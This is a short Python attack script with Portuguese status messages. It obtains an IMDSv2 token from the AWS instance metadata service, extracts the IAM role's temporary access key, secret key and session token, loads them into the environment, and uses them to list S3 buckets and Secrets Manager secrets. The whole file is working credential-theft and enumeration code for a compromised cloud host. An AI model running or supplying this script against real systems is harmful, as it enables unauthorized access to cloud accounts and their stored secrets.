import urllib.request as r
import json
import os
import subprocess

def get_metadata(path, token=None):
    url = f"http://169.254.169.254/latest/meta-data/{path}"
    headers = {"X-aws-ec2-metadata-token": token} if token else {}
    req = r.Request(url, headers=headers)
    return r.urlopen(req).read().decode()

try:
    print("[+] Obtendo Token IMDSv2...")
    token_url = "http://169.254.169.254/latest/api/token"
    token_req = r.Request(token_url, method='PUT', headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
    token = r.urlopen(token_req).read().decode()

    print("[+] Descobrindo IAM Role...")
    role = get_metadata("iam/security-credentials/", token).strip()
    
    print(f"[+] Extraindo chaves para a Role: {role}")
    creds_json = json.loads(get_metadata(f"iam/security-credentials/{role}", token))

    # Configura as variáveis no ambiente do processo atual
    os.environ["AWS_ACCESS_KEY_ID"] = creds_json['AccessKeyId']
    os.environ["AWS_SECRET_ACCESS_KEY"] = creds_json['SecretAccessKey']
    os.environ["AWS_SESSION_TOKEN"] = creds_json['Token']
    os.environ["AWS_DEFAULT_REGION"] = "us-east-1"

    print("\n[!] SUCESSO! Credenciais carregadas.\n")
    
    print("--- TESTE: Identidade ---")
    subprocess.run(["aws", "sts", "get-caller-identity"])

    print("\n--- TESTE: Listagem S3 ---")
    subprocess.run(["aws", "s3", "ls"])

    print("\n--- TESTE: Secrets Manager ---")
    subprocess.run(["aws", "secretsmanager", "list-secrets", "--region", "us-east-1"])

except Exception as e:
    print(f"[-] Erro: {e}")
